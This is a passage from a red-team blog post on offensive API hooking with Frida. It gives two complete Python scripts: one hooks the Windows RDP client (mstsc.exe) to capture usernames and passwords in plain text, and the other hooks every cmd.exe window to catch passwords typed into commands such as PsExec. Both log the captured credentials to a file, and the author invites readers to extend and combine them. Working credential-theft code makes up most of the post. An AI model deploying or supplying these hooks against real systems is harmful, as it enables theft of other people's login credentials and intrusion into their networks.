</pre></table></code></div></div><h2 id="rdp">RDP</h2><hr /><p>Reading the MDSec <a href="https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/">blog post</a> and Red Teaming Experiments <a href="https://www.ired.team/offensive-security/code-injection-process-injection/api-monitoring-and-hooking-for-offensive-tooling">blog</a> I thought to myself, there’s must be a simple way to hook RDP credentials.</p><p>Looking at the Graphical Runas prompt and the RDP login prompt they look alike:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/rdpvsRunas.png" alt="" /></p><p>What if they use the same API call? Let’s try:</p><p>Using the same script from the Credentials Prompt we were able to get the RDP credentials !!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/FridaRdpTest.png" alt="" /></p><p>All left to do is to write the final python script, It should look like that:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
</pre><td class="rouge-code"><pre><span class="c1"># Wrriten by Ilan Kalendarov
</span>
<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
<span class="kn">import</span> <span class="nn">frida</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="nn">psutil</span>
<span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Lock</span><span class="p">,</span> <span class="n">Thread</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="c1"># Locking the mstsc thread to prevent other threads
#interfering with our current session
</span><span class="n">lockRDP</span><span class="o">=</span> <span class="n">Lock</span><span class="p">()</span>  

<span class="k">def</span> <span class="nf">on_message_rdp</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
	<span class="c1"># Executes when the user enters the password.
</span>	<span class="c1"># Then, open the txt file and append the data.
</span>	<span class="k">print</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">message</span><span class="p">[</span><span class="s">'type'</span><span class="p">]</span> <span class="o">==</span> <span class="s">"send"</span><span class="p">:</span>
		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"Creds.txt"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
			<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">message</span><span class="p">[</span><span class="s">"payload"</span><span class="p">]</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">lockRDP</span><span class="p">.</span><span class="n">release</span><span class="p">()</span>
			<span class="k">print</span><span class="p">(</span><span class="s">"[+] released"</span><span class="p">)</span>
		<span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
			<span class="k">pass</span>


<span class="k">def</span> <span class="nf">WaitForRDP</span><span class="p">():</span>
	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
		<span class="c1"># Trying to find if mstsc is running if so, execute the "RunAs" function.
</span>		<span class="k">if</span> <span class="p">(</span><span class="s">"mstsc.exe"</span> <span class="ow">in</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">name</span><span class="p">()</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">psutil</span><span class="p">.</span><span class="n">process_iter</span><span class="p">()))</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">lockRDP</span><span class="p">.</span><span class="n">locked</span><span class="p">():</span>
			<span class="n">lockRDP</span><span class="p">.</span><span class="n">acquire</span><span class="p">()</span> <span class="c1"># Locking the mstsc thread
</span>			<span class="k">print</span><span class="p">(</span><span class="s">"[+] Found RunAs"</span><span class="p">)</span>
			<span class="n">RDP</span><span class="p">()</span>
			<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>

		<span class="c1"># If the user regret and they close mstsc then we will release the thread lock and start over.
</span>		<span class="k">elif</span> <span class="p">(</span><span class="ow">not</span> <span class="s">"mstsc.exe"</span> <span class="ow">in</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">name</span><span class="p">()</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">psutil</span><span class="p">.</span><span class="n">process_iter</span><span class="p">()))</span> <span class="ow">and</span> <span class="n">lockRDP</span><span class="p">.</span><span class="n">locked</span><span class="p">():</span>
			<span class="n">lockRDP</span><span class="p">.</span><span class="n">release</span><span class="p">()</span>
			<span class="k">print</span><span class="p">(</span><span class="s">"[+] RDP is dead releasing lock"</span><span class="p">)</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">pass</span>
		<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">RDP</span><span class="p">():</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="c1"># Attaching to the mstsc process
</span>		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Trying To Attach To RDP"</span><span class="p">)</span>
		<span class="n">session</span> <span class="o">=</span> <span class="n">frida</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="s">"mstsc.exe"</span><span class="p">)</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Attached to mstsc!"</span><span class="p">)</span>

		<span class="c1"># Executing the following javascript
</span>		<span class="c1"># We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the username,password,domain and the executing 		program in plain text.
</span>		<span class="n">script</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">create_script</span><span class="p">(</span><span class="s">"""

		var username;
		var password;
		var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")

		Interceptor.attach(CredUnPackAuthenticationBufferW, {
			onEnter: function (args) 
			{

				username = args[3];
				password = args[7];
			},
			onLeave: function (result)
			{
			   
				var user = username.readUtf16String()
				var pass = password.readUtf16String()

				if (user &amp;&amp; pass)
				{
					send("</span><span class="se">\\</span><span class="s">n+ Intercepted RDP Credentials</span><span class="se">\\</span><span class="s">n" + user + ":" + pass)
				}
			}
		});

		"""</span><span class="p">)</span>
		<span class="c1"># If we got a hit then execute the "on_message_rdp" function
</span>		<span class="n">script</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="s">'message'</span><span class="p">,</span> <span class="n">on_message_rdp</span><span class="p">)</span>
		<span class="n">script</span><span class="p">.</span><span class="n">load</span><span class="p">()</span>
	<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
	<span class="n">thread</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">WaitForRDP</span><span class="p">)</span>
	<span class="n">thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
</pre></table></code></div></div><p>Executing the script will get us the creds:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/RdpCreds.png" alt="" /></p><h2 id="psexec">PsExec</h2><hr /><p>Last but not least, PsExec - the great remoting tool from the sysinternals suite, This was interesting to research. Let’s open API Monitor and load PsExec with the right arguments, The result is:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/PsExecResukt.png" alt="" /></p><p><code class="language-plaintext highlighter-rouge">WNetAddConnection2W</code> is the function that contains our secret password. If we’ll try to implement this we’ll run into a problem, Frida won’t have time to attach to the <code class="language-plaintext highlighter-rouge">PsExec.exe</code> process because we are giving the password as an argument, Let’s try it:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/PSEXECerror.png" alt="" /></p><p>The script was not fast enough to catch the credentials we need to find a different way. Looking at this I thought to myself, what if we hook everything that was entered inside the command prompt? Let’s find out. This time I’ll try to monitor the command prompt and check for our secret password:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/CmdExplore.png" alt="" /></p><p>We can see there is a new thread under, Searching for our password resulted in the <code class="language-plaintext highlighter-rouge">RtlInitUnicodeStringEx</code> function from <code class="language-plaintext highlighter-rouge">Ntdll.dll</code>. unfortunately, there are no docs available at Microsoft like most of the Ntdll library. But we can see the arguments that the function takes. The second argument - <code class="language-plaintext highlighter-rouge">SourceString</code> looks interesting as it contains the whole command, We also can see that the function is used <strong>a lot</strong> of times, Basically every time the user gives input to the command prompt, So we need to build a filter mechanism in order to filter unwanted garbage.</p><p>Final script should look like this:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
</pre><td class="rouge-code"><pre><span class="c1"># Wrriten by Ilan Kalendarov
</span>
<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
<span class="kn">import</span> <span class="nn">frida</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="nn">psutil</span>
<span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Lock</span><span class="p">,</span> <span class="n">Thread</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="c1"># Locking the cmd thread to prevent other threads
#interfering with our current session
</span><span class="n">lockCmd</span> <span class="o">=</span> <span class="n">Lock</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">on_message_cmd</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
	<span class="c1"># Executes when the user enters the right keyword from the array above.
</span>	<span class="c1"># Then, open the txt file and append it
</span>
	<span class="c1">#filter the wanted args
</span>	<span class="n">arr</span> <span class="o">=</span> <span class="p">[</span><span class="s">"-p"</span><span class="p">,</span> <span class="s">"pass"</span><span class="p">,</span> <span class="s">"password"</span><span class="p">]</span>
	<span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">name</span> <span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">arr</span> <span class="k">if</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">message</span><span class="p">[</span><span class="s">'payload'</span><span class="p">]):</span>
		<span class="k">print</span><span class="p">(</span><span class="n">message</span><span class="p">[</span><span class="s">'payload'</span><span class="p">])</span>
		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"Creds.txt"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
			<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">message</span><span class="p">[</span><span class="s">'payload'</span><span class="p">]</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">lockCmd</span><span class="p">.</span><span class="n">release</span><span class="p">()</span>
			<span class="k">print</span><span class="p">(</span><span class="s">"[+] released"</span><span class="p">)</span>
		<span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
			<span class="k">pass</span>


<span class="k">def</span> <span class="nf">WaitForCmd</span><span class="p">():</span>
	<span class="n">numOfCmd</span> <span class="o">=</span> <span class="p">[]</span>
	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
		<span class="c1">#  Trying to find if cmd is running if so, execute the "CMD" function.
</span>		<span class="k">if</span> <span class="p">(</span><span class="s">"cmd.exe"</span> <span class="ow">in</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">name</span><span class="p">()</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">psutil</span><span class="p">.</span><span class="n">process_iter</span><span class="p">())):</span>
			<span class="n">process</span> <span class="o">=</span> <span class="nb">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">p</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">name</span><span class="p">()</span> <span class="o">==</span> <span class="s">"cmd.exe"</span><span class="p">,</span> <span class="n">psutil</span><span class="p">.</span><span class="n">process_iter</span><span class="p">())</span>
			<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">process</span><span class="p">:</span>
				<span class="c1"># if we alredy hooked the cmd window,pass
</span>				<span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">pid</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">numOfCmd</span><span class="p">):</span>
					<span class="c1">#IF a new cmd window pops add it to the array, we want to hook
</span>					<span class="c1">#evey cmd window
</span>					<span class="n">numOfCmd</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">pid</span><span class="p">)</span>
					<span class="n">lockCmd</span><span class="p">.</span><span class="n">acquire</span><span class="p">()</span>
					<span class="k">print</span><span class="p">(</span><span class="s">"[+] Found cmd"</span><span class="p">)</span>
					<span class="n">Cmd</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">pid</span><span class="p">)</span>
					<span class="n">lockCmd</span><span class="p">.</span><span class="n">release</span><span class="p">()</span>
					<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>

		<span class="c1"># if cmd is dead release the lock
</span>		<span class="k">elif</span> <span class="p">(</span><span class="ow">not</span> <span class="s">"cmd.exe"</span> <span class="ow">in</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">name</span><span class="p">()</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">psutil</span><span class="p">.</span><span class="n">process_iter</span><span class="p">()))</span> <span class="ow">and</span> <span class="n">lockCmd</span><span class="p">.</span><span class="n">locked</span><span class="p">():</span>
			<span class="n">lockCmd</span><span class="p">.</span><span class="n">release</span><span class="p">()</span>
			<span class="k">print</span><span class="p">(</span><span class="s">"[+] cmd is dead releasing lock"</span><span class="p">)</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">pass</span>
		<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">Cmd</span><span class="p">(</span><span class="n">Cmdpid</span><span class="p">):</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="c1"># attaching to the cmd window, this time with the right pid
</span>		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Trying To Attach To cmd"</span><span class="p">)</span>
		<span class="n">session</span> <span class="o">=</span> <span class="n">frida</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">Cmdpid</span><span class="p">)</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Attached cmd with pid {}!"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">Cmdpid</span><span class="p">))</span>
		<span class="n">script</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">create_script</span><span class="p">(</span><span class="s">"""
			var username;
			var password;
			var CredUnPackAuthenticationBufferW = Module.findExportByName("Ntdll.dll", "RtlInitUnicodeStringEx")			
			Interceptor.attach(CredUnPackAuthenticationBufferW, {
				onEnter: function (args) 
				{
					password = args[1];
				},
				onLeave: function (result)
				{
					// Credentials are now decrypted
					var pass = password.readUtf16String();
			
					if (pass)
					{
						send("</span><span class="se">\\</span><span class="s">n+ Intercepted cmd Creds</span><span class="se">\\</span><span class="s">n" + ":" + pass);
					}
				}
			});

		"""</span><span class="p">)</span>
		<span class="n">script</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="s">'message'</span><span class="p">,</span> <span class="n">on_message_cmd</span><span class="p">)</span>
		<span class="n">script</span><span class="p">.</span><span class="n">load</span><span class="p">()</span>
	<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
	<span class="n">thread</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">WaitForCmd</span><span class="p">)</span>
	<span class="n">thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
</pre></table></code></div></div><p>The result would be:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/cmdResukt.png" alt="" /></p><p>Great! we were able to intercept the credentials.</p><h2 id="conclusion">Conclusion</h2><p>This was my first blog, hopefully, many more to come. I’ve learned a lot researching this topic. You can expand the scripts to your personal needs or even combine all of them together, I’ll leave it for you to explore ;).</p><p>Feedback and additions or corrections are strongly encouraged. You can reach me via the above channels.</p><h2 id="links--resources">Links &amp; Resources</h2><ul><li>Instrumeting Windows APIs With Frida - <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/instrumenting-windows-apis-with-frida">https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/instrumenting-windows-apis-with-frida</a><li>RdpThief - <a href="https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/">https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/</a><li>Frida <a href="https://frida.re/">https://frida.re/</a><li>Api Monitor - <a href="http://www.rohitab.com/apimonitor">http://www.rohitab.com/apimonitor</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/red-team/'>Red Team</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/persistence/" class="post-tag no-text-decoration" >persistence</a> <a href="/tags/av-evasion/" class="post-tag no-text-decoration" >av evasion</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Offensive API Hooking - Ilan Kalendarov&url=https://ilankalendarov.github.io/posts/offensive-hooking/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Offensive API Hooking - Ilan Kalendarov&u=https://ilankalendarov.github.io/posts/offensive-hooking/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Offensive API Hooking - Ilan Kalendarov&url=https://ilankalendarov.github.io/posts/offensive-hooking/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/offensive-hooking/">Offensive API Hooking</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/av-evasion/">av evasion</a> <a class="post-tag" href="/tags/persistence/">persistence</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/IKalendarov">Ilan Kalendarov</a>. <span data-toggle="tooltip" data-placement="top" title="">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/av-evasion/">av evasion</a> <a class="post-tag" href="/tags/persistence/">persistence</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ilankalendarov.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
